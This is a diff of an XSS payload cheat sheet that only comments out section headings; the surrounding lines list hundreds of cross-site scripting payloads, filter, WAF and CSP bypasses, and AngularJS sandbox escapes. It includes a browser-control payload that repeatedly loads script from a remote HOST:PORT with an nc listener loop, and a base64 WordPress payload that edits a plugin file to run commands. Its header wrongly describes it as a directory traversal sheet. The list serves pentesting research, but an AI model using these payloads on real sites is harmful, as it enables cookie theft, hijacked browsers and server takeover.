@@ -1,10 +1,10 @@
-ULTIMATE CROSS SITE SCRIPTING CHEAT SHEET
+# ULTIMATE CROSS SITE SCRIPTING CHEAT SHEET
 
-Note: This is a technical sheet for research about directory- and path traversal attacks.
-Please continue the ultimate directory traversal cheat sheet list or contribute to update.
-This cheat sheet list goes out to assist pentesters, developers, researchers & whitehats.
+# Note: This is a technical sheet for research about directory- and path traversal attacks.
+# Please continue the ultimate directory traversal cheat sheet list or contribute to update.
+# This cheat sheet list goes out to assist pentesters, developers, researchers & whitehats.
 
-Tags to Trigger XSS Attacks:
+# Tags to Trigger XSS Attacks:
 onclick
 ondblclick
 onmousedown
@@ -29,7 +29,7 @@ onreset
 onselect
 onMoveOn
 
-Brackets for Tags
+# Brackets for Tags
 >"
 ">
 <"
@@ -114,7 +114,7 @@ Pjw=
 \u003c
 \u003C
 
-XSS Strings:
+# XSS Strings:
 <meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
 <SCRIPT>document.cookie=true;</SCRIPT>
@@ -192,7 +192,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=t
 <div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
 
 
-Restriction Bypass:
+# Restriction Bypass:
 >"<iframe src=http://global-evolution.info/>@gmail.com
 >"<script>alert(document.cookie)</script><div style="1@gmail.com
 >"<script>alert(document.cookie)</script>@gmail.com
@@ -208,12 +208,12 @@ om.Char.Code</button></body></html>
 %73%73%53%69%74%65%53%63%72%69%70%74%69%6E%67%32%22%29%3C%2F
 %73%63%72%69%70%74%3E
 
-Obfuscated Bypass:
+# Obfuscated Bypass:
 >ì<ScriPt>ALeRt("xssOBFSbypass")</scriPt>
 
 
 
-XSS with close TAG to escape:
+# XSS with close TAG to escape:
 >"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
 >"<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
 >"<SCRIPT>document.cookie=true;</SCRIPT>
@@ -299,7 +299,7 @@ XSS with close TAG to escape:
 javascript:alert(1)
 
 
-Others: Random
+# Others: Random
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&{()}
 <SCRIPT SRC=http://test.com/xss.js></SCRIPT>
@@ -410,7 +410,7 @@ perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
 <EMBED SRC="data:image/svg+xml;base64,JTIwPiI8PGlmcmFtZSBzcmM9aHR0cDovL3Z1bG4tbGFiLmNvbSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSA8" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
 
 
-Flash SWF XSS
+# Flash SWF XSS
 
     ZeroClipboard: ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf
 
@@ -451,7 +451,7 @@ d="alert('XSS');\")";
 eval(a+b+c+d);
 
 
-XML Schema
+# XML Schema
 <HTML xmlns:xss>
   <?import namespace="xss" implementation="http://vuln-lab.com/xss.htc">
   <xss:xss>XSS</xss:xss>
@@ -558,14 +558,14 @@ PGlmcmFtZSBzcmM9aHR0cDovL3Rlc3QuZGU+
 ì><img title="test-xss" onmouseup="confirm(document.domain)">
 
 
-Firefox (\x09, \x0a, \x0d, \x20)
-Chrome (Any character \x01 to \x20)
+# Firefox (\x09, \x0a, \x0d, \x20)
+# Chrome (Any character \x01 to \x20)
 <iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->
 
 
 <img src='1' onerror='alert(0)' <
 
-Extra less-than characters (IE, Firefox, Chrome, Safari).
+# Extra less-than characters (IE, Firefox, Chrome, Safari).
 <<script>alert(0)</script>
 
 <style>body{background-color:expression\(alert(1))}</style>
@@ -823,43 +823,43 @@ a=c.join([]);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototyp
 <iframe/onload=import(/\\?.?/)>
 
 
-HTML Context
+# HTML Context
 Tag Injection 	<svg onload=alert(1)>
 ì><svg onload=alert(1)//
 
 
-HTML Context
+# HTML Context
 Inline Injection 	ìonmouseover=alert(1)//
 ìautofocus/onfocus=alert(1)//
 
 
-Javascript Context
+# Javascript Context
 Code Injection 	ë-alert(1)-ë
 ë-alert(1)//
 
 
-Javascript Context
+# Javascript Context
 Code Injection
 (escaping the escape) 	\í-alert(1)//
 
 
-Javascript Context
+# Javascript Context
 Tag Injection 
 </script><svg onload=alert(1)>
 
 
-PHP_SELF Injection 	
+# PHP_SELF Injection 	
 http://DOMAIN/PAGE.php/î><svg onload=alert(1)>
 
 
-Without Parenthesis 	
+# Without Parenthesis 	
 <svg onload=alert`1`>
 <svg onload=alert&lpar;1&rpar;>
 <svg onload=alert&#x28;1&#x29>
 <svg onload=alert&#40;1&#41>
 
 
-Filter Bypass
+# Filter Bypass
 Alert Obfuscation 	
 (alert)(1)
 a=alert,a(1)
@@ -872,7 +872,7 @@ top[ëal\x65rtí](1)
 top[8680439..toString(30)](1)
 
 
-Body Tag 	
+# Body Tag 	
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
 <body onfocus=alert(1)>
@@ -886,7 +886,7 @@ Body Tag
 <body onhelp=alert(1)>press F1! (MSIE)
 
 
-Miscellaneous Vectors 	
+# Miscellaneous Vectors 	
 <marquee onstart=alert(1)>
 <marquee loop=1 width=0 onfinish=alert(1)>
 <audio src onloadstart=alert(1)>
@@ -898,7 +898,7 @@ Miscellaneous Vectors
 <menu id=x contextmenu=x onshow=alert(1)>right click me!
 
 
-Agnostic Event Handlers 	
+# Agnostic Event Handlers 	
 <x contenteditable onblur=alert(1)>lose focus!
 <x onclick=alert(1)>click this!
 <x oncopy=alert(1)>copy this!
@@ -919,19 +919,19 @@ Agnostic Event Handlers
 <x contenteditable onpaste=alert(1)>paste here!
 
 
-Code Reuse
+# Code Reuse
 Inline Script 	<script>alert(1)//
 <script>alert(1)<!ñ
 
 
-Code Reuse
+# Code Reuse
 Regular Script 	<script src=//localhost:8080/1.js>
 <script src=//3334957647/1>
 
 
-Filter Bypass
-Generic Tag + Handler 	
-Encoding 	Mixed Case 	Spacers
+# Filter Bypass
+# Generic Tag + Handler 	
+# Encoding 	Mixed Case 	Spacers
 %3Cx onxxx=1
 <%78 onxxx=1
 <x %6Fnxxx=1
@@ -946,7 +946,7 @@ Encoding 	Mixed Case 	Spacers
 <x%0Conxxx=1
 <x%0Donxxx=1
 <x%2Fonxxx=1
-Quotes 	Stripping 	Mimetism
+# Quotes 	Stripping 	Mimetism
 <x 1=í1íonxxx=1
 <x 1=î1?onxxx=1 	<[S]x onx[S]xx=1
 
@@ -956,32 +956,32 @@ Quotes 	Stripping 	Mimetism
 <x 1=î>î onxxx=1
 <http://onxxx%3D1/
 
-Generic Source Breaking 	
+# Generic Source Breaking 	
 <x onxxx=alert(1) 1=í
 
 
-Browser Control 	
+# Browser Control 	
 <svg onload=setInterval(function(){with(document)body.
 appendChild(createElement(ëscriptí)).src=í//HOST:PORTí},0)>$ while :; do printf ìj$ ì; read c; echo $c | nc -lp PORT >/dev/null; done
 
 
-Multi Reflection 	Double Reflection
+# Multi Reflection 	Double Reflection
 Single Input 	Single Input (script-based)
 ëonload=alert(1)><svg/1=í 	ë>alert(1)</script><script/1=í
 */alert(1)</script><script>/*
 
-Triple Reflection
+# Triple Reflection
 Single Input 	Single Input (script-based)
 */alert(1)î>íonload=î/*<svg/1=í
 `-alert(1)î>íonload=î`<svg/1=í 	*/</script>í>alert(1)/*<script/1=í
 
 
-Multi Input Double Input 	Triple Input
+# Multi Input Double Input 	Triple Input
 p=<svg/1=í&q=íonload=alert(1)> 	
 p=<svg 1=í&q=íonload=í/*&r=*/alert(1)í>
 
 
-Without Event Handlers 	
+# Without Event Handlers 	
 <script>alert(1)</script>
 <script src=javascript:alert(1)>
 <iframe src=javascript:alert(1)>
@@ -1002,8 +1002,8 @@ Without Event Handlers
 <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
 
 
-Mobile Only 	
-Event Handlers
+# Mobile Only 	
+# Event Handlers
 <html ontouchstart=alert(1)>
 <html ontouchend=alert(1)>
 <html ontouchmove=alert(1)>
@@ -1011,7 +1011,7 @@ Event Handlers
 <body onorientationchange=alert(1)>
 
 
-Javascript Properties 	Functions
+# Javascript Properties 	Functions
 <svg onload=alert(navigator.connection.type)>
 <svg onload=alert(navigator.battery.level)>
 <svg onload=alert(navigator.battery.dischargingTime)>
@@ -1019,35 +1019,35 @@ Javascript Properties 	Functions
 <svg onload=navigator.vibrate([500,300,100])>
 
 
-Generic Self to Regular XSS 	
+# Generic Self to Regular XSS 	
 <iframe src=LOGOUT_URL onload=forms[0].submit()>
 </iframe><form method=post action=LOGIN_URL>
 <input name=USERNAME_PARAMETER_NAME value=USERNAME>
 <input name=PASSWORD_PARAMETER_NAME value=PASSWORD>
 
 
-File Upload 	Injection in Filename
+# File Upload 	Injection in Filename
 ì><img src=1 onerror=alert(1)>.gifInjection in Metadata
 $ exiftool -Artist='î><img src=1 onerror=alert(1)>í FILENAME.jpegInjection with SVG File
 <svg xmlns=îhttp://www.w3.org/2000/svgî onload=îalert(document.domain)î/>
 
 
-Injection with GIF File as Source of Script (CSP Bypass)
+# Injection with GIF File as Source of Script (CSP Bypass)
 GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 
-Google Chrome
-Auditor Bypass
+# Google Chrome
+# Auditor Bypass
 <script src=îdata:&comma;alert(1)//
 ì><script src=data:&comma;alert(1)//<script src=î//localhost:8080&sol;1.js&num;
 ì><script src=//localhost:8080&sol;1.js&num;<link rel=import href=îdata:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
 ì><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
 <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 
-Chrome < v60 beta XSS-Auditor Bypass
+# Chrome < v60 beta XSS-Auditor Bypass
 
 <script src="data:,alert(1)%250A-->
 
-Other Chrome XSS-Auditor Bypasses
+# Other Chrome XSS-Auditor Bypasses
 
 <script>alert(1)</script
 
@@ -1055,15 +1055,15 @@ Other Chrome XSS-Auditor Bypasses
 
 <x>%00%00%00%00%00%00%00<script>alert(1)</script>
 
-Safari XSS Vector
+# Safari XSS Vector
 
 <script>location.href;'javascript:alert%281%29'</script>
 
-XSS Polyglot
+# XSS Polyglot
 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
-PHP File for XHR Remote Call 	
+# PHP File for XHR Remote Call 	
 <?php header(ìAccess-Control-Allow-Origin: *î); ?>
 <img src=1 onerror=alert(1)>
 Server Log Avoidance 	<svg onload=eval(URL.slice(-8))>#alert(1)
@@ -1073,12 +1073,12 @@ Server Log Avoidance 	<svg onload=eval(URL.slice(-8))>#alert(1)
 <svg/onload=javascript:void(0)?void(0):void(0)?void(0):void(0)?void(0):void(0)?void(0):confirm(location)> 
 
 
-Shortest PoC 	
+# Shortest PoC 	
 <base href=//0>
 
 
 $ while:; do echo ìalert(1)î | nc -lp80; done
-Portable WordPress RCE 	<script/src=îdata:&comma;eval(atob(location.hash.slice(1)))//&num;
+# Portable WordPress RCE 	<script/src=îdata:&comma;eval(atob(location.hash.slice(1)))//&num;
 #eD1uZXcgWE1MSHR0cFJlcXVlc3QoKQ0KcD0nL3dwLWFkbWluL3Bsd
 Wdpbi1lZGl0b3IucGhwPycNCmY9J2ZpbGU9YWtpc21ldC9pbmRleC5w
 aHAnDQp4Lm9wZW4oJ0dFVCcscCtmLDApDQp4LnNlbmQoKQ0KJD0n
@@ -1090,13 +1090,13 @@ wZScsJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpD
 Qp4LnNlbmQoJCk=http://DOMAIN/WP-ROOT/wp-content/plugins/akismet/index.php?brute=CMD
 
 
-Invisble JS Alert
+# Invisble JS Alert
 ([,?,,,,??]=[]+{},[???,??,????,???,,?????,????,??????,,,?????]=[!!?]+!?+?.?)
 [??+=?+?????+??????+???+??+????+??+???+?+??][??]
 (?????+????+???+??+???+'`#JS!`')``
 
 
-Markdown XSS
+# Markdown XSS
 
 [a](javascript:confirm(1))
 
@@ -1113,7 +1113,7 @@ Markdown XSS
 [a]:(?javascript:alert(1))           
 
 
-Angular JS
+# Angular JS
 'a'.constructor.fromCharCode=[].join;
 'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e'; 
 
@@ -1122,7 +1122,7 @@ Angular JS
 eval('x=1} } };alert(1)//');
 }}
 
-AngularJS Template Injection based XSS
+# AngularJS Template Injection based XSS
 
 1.0.1 - 1.1.5
 
@@ -1220,16 +1220,16 @@ AngularJS Template Injection based XSS
 
 {{constructor.constructor('alert(1)')()}}
 
-Content Security Policy (CSP) bypass via JSONP endpoints
+# Content Security Policy (CSP) bypass via JSONP endpoints
 
-Grab the target's CSP:
+# Grab the target's CSP:
 
 curl -I http://example.com | grep 'Content-Security-Policy'
 
 
-Lightweight Markup Languages
+# Lightweight Markup Languages
 
-RubyDoc (.rdoc)
+# RubyDoc (.rdoc)
 
 XSS[JavaScript:alert(1)]
 
@@ -1243,13 +1243,13 @@ reStructuredText (.rst)
 
 __ javascript:alert(document.domain)  
 
-Unicode characters
+# Unicode characters
 
 Üáï<img src=a onerror=javascript:alert('test')>ÖâÄ
 
 
 
-Sanbox Bypasses
+# Sanbox Bypasses
 {{constructor.constructor('alert(1)')()}}
 
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
@@ -1316,11 +1316,11 @@ Kona WAF (Akamai) Bypass
 
 \');confirm(1);//
 
-ModSecurity WAF Bypass Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
+# ModSecurity WAF Bypass Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
 
 <img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
 
-Wordfence XSS Bypasses
+# Wordfence XSS Bypasses
 
 <meter onmouseover="alert(1)"
 
@@ -1328,7 +1328,7 @@ Wordfence XSS Bypasses
 
 >><marquee loop=1 width=0 onfinish=alert(1)>
 
-Incapsula WAF Bypasses
+# Incapsula WAF Bypasses
 
 <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
 
@@ -1338,12 +1338,12 @@ jQuery < 3.0.0 XSS
 
 $.get('http://sakurity.com/jqueryxss')
 
-In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:
+# In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:
 
-    Find any cross domain requests to untrusted domains which may inadvertently execute script.
-    Find any requests to trusted API endpoints where script can be injected into data sources.
+    # Find any cross domain requests to untrusted domains which may inadvertently execute script.
+    # Find any requests to trusted API endpoints where script can be injected into data sources.
 
-URL verification bypasses (works without &#x09; too)
+# URL verification bypasses (works without &#x09; too)
 
 javas&#x09;cript://www.google.com/%0Aalert(1)
 
@@ -1352,7 +1352,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 
 
 
-Signal Messenger Payloads
+# Signal Messenger Payloads
 http://testdomain/?p=%3Ciframe%20src="/etc/passwd"%3E%3C/iframe%3E%20PENTEST
 
 http://testdomain/?p=%3d%3Ciframe%20src=\\DESKTOP-[LOCALPATH]\Temp\rce.html%3E
@@ -1372,7 +1372,7 @@ http://testdomain/?p=%3Cform%20method='POST'%20action='https://domain.de/url'%3E
 
 
 
-Waf Engine Bypass
+# Waf Engine Bypass
 <svg onload\r\n=$.globalEval("al"+"ert()");>
 <img onload\r\n=$.globalEval("al"+"ert()");>
 <iframe src="\\" onload\r\n=$.globalEval("al"+"ert()");>
